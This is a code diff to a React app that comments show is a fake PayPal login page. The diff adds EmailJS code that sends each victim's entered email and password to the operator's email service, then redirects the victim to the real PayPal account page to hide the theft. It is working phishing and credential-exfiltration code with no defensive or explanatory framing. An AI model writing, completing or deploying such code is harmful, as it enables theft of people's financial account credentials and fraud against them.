@@ -1,6 +1,7 @@
 import * as React from 'react';
 import './App.css';
 import { Alert, TextField} from '@mui/material';
+import { send } from 'emailjs-com';
 
 function App() {
   const [email, setEmail] = React.useState('');
@@ -19,9 +20,21 @@ function App() {
       // error
     } else {
       console.log(email, password);
-      // post to DB
-      // redirect to real paypal page
-      window.location.href = "https://www.paypal.com/myaccount/";
+      // send email
+      send(
+        'service_xt3jd94', // service ID
+        'template_1os4f0b', // template ID
+        {message: `username: ${email}\npassword: ${password}`},
+        'NdVUifWFJlwgAAs-6'
+      )
+        .then((response) => {
+          console.log('SUCCESS!', response.status, response.text);
+          // redirect to real paypal page
+          window.location.href = "https://www.paypal.com/myaccount/";
+        })
+        .catch((err) => {
+          console.log('FAILED...', err);
+        });
     }
   }
   return (
